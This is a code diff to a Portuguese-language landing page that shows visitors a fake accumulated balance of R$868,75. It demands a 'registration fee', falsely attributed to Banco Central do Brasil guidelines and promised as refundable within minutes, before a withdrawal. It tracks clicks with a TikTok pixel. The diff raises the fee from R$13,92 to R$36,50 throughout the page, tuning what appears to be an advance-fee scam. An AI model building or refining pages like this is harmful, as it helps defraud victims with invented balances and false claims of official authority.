@@ -16,7 +16,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     p = Object.assign({}, p || {});
     var cid = String(p.content_id || (p.contents && p.contents[0] && p.contents[0].content_id) || 'taxa_confirmacao_tiktok').trim() || 'taxa_confirmacao_tiktok';
     var cname = String(p.content_name || (p.contents && p.contents[0] && p.contents[0].content_name) || 'Taxa de Confirmacao TikTok').trim() || 'Taxa de Confirmacao TikTok';
-    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 13.92);
+    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 36.50);
     p.content_id = cid; p.content_ids = [cid]; p.content_type = 'product'; p.content_name = cname; p.value = val; p.currency = p.currency || 'BRL';
     p.contents = [{ content_id: cid, content_type: 'product', content_name: cname, quantity: 1, price: val }];
     return p;
@@ -144,7 +144,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
         <h1 class="page-title">Taxa de Cadastro</h1>
       </div>
 
-      <p class="desc fu d3">Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de <strong data-taxa>R$ 13,92</strong> para garantir a autenticidade dos participantes.</p>
+      <p class="desc fu d3">Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de <strong data-taxa>R$ 36,50</strong> para garantir a autenticidade dos participantes.</p>
             <p class="desc2 fu d4">O dinheiro será totalmente reembolsado entre 1 a 5 minutos junto ao saldo acumulado de <strong id="saldo-taxa">R$868,75</strong>.</p>
 
       <div class="features">
@@ -154,7 +154,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
         </div>
         <div class="feat fu d6">
                   <div class="feat-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></svg></div>
-                  <div><div class="feat-title">Valor reembolsável</div><div class="feat-desc">Você recebe os <span data-taxa>R$ 13,92</span> de volta após finalizar.</div></div>
+                  <div><div class="feat-title">Valor reembolsável</div><div class="feat-desc">Você recebe os <span data-taxa>R$ 36,50</span> de volta após finalizar.</div></div>
                 </div>
         <div class="feat fu d7">
           <div class="feat-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
@@ -245,7 +245,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   // Top bar sempre visível
   document.getElementById('top-bar-text').textContent = 'Assista ao vídeo abaixo para liberar seu saque de ' + fmt(balance);
 
-  var TAXA        = parseFloat(params.get('taxa')) || 13.92;
+  var TAXA        = parseFloat(params.get('taxa')) || 36.50;
   var btnRealizar = document.getElementById('btn-realizar');
   var secaoTaxa   = document.getElementById('secao-taxa');
   var secaoVsl    = document.getElementById('secao-vsl');
@@ -366,7 +366,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   ctaBtn.addEventListener('click', function(){
     if(!liberado) return;
     if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){
-      try { ttq.track('InitiateCheckout', { content_id: 'taxa_confirmacao_tiktok', content_type: 'product', content_name: 'Taxa de Confirmação', contents: [{ content_id: 'taxa_confirmacao_tiktok', content_type: 'product', content_name: 'Taxa de Confirmação', quantity: 1, price: TAXA || 13.92 }], value: TAXA || 13.92, currency: 'BRL' }); } catch(e){}
+      try { ttq.track('InitiateCheckout', { content_id: 'taxa_confirmacao_tiktok', content_type: 'product', content_name: 'Taxa de Confirmação', contents: [{ content_id: 'taxa_confirmacao_tiktok', content_type: 'product', content_name: 'Taxa de Confirmação', quantity: 1, price: TAXA || 36.50 }], value: TAXA || 36.50, currency: 'BRL' }); } catch(e){}
     }
     clearInterval(expiryInt);
     var dest = new URL('../5/index.html', window.location.href);
